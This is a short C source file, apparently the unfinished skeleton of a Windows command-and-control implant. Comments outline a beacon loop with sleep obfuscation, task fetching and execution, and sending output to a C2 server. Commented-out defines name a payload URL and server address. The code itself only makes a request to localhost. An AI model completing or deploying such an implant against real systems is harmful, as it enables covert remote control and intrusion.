
#include <windows.h>
#include <stdio.h>
#include "transport/transport.h"


// #define PAYLOAD	L"http://127.0.0.1:8080/calc.bin"
// #define SERVER L"http://192.168.1.76"

/* Main demon routine:
 *
 * 1. Connect to listener
 * 2. Go into tasking routine:
 *      A. Sleep Obfuscation.
 *      B. Request for the task queue
 *      C. Parse Task
 *      D. Execute Task (if it's not DEMON_COMMAND_NO_JOB)
 *      E. Goto C (we do this til there is nothing left)
 *      F. Goto A (we have nothing else to execute then lets sleep and after waking up request for more)
 * 3. Sleep Obfuscation. After that lets try to connect to the listener again
 */

VOID StartDemon() {

}

typedef struct {
	// SESSION Session = NULL;
	DWORD sleepSeconds; // esto tendria que ser random
} Implant;

int main(){

	// 1 - start web client and start listening tasks
	// 2 - parse and execute task
	// 3 - send output to c2
	// 4 - sleep and repeat

	if (!MakeRequest(L"127.0.0.1", 8000)) {
		printf("[!] Failed to make request: %d \n", GetLastError());
	}
		
	

	return 0;
}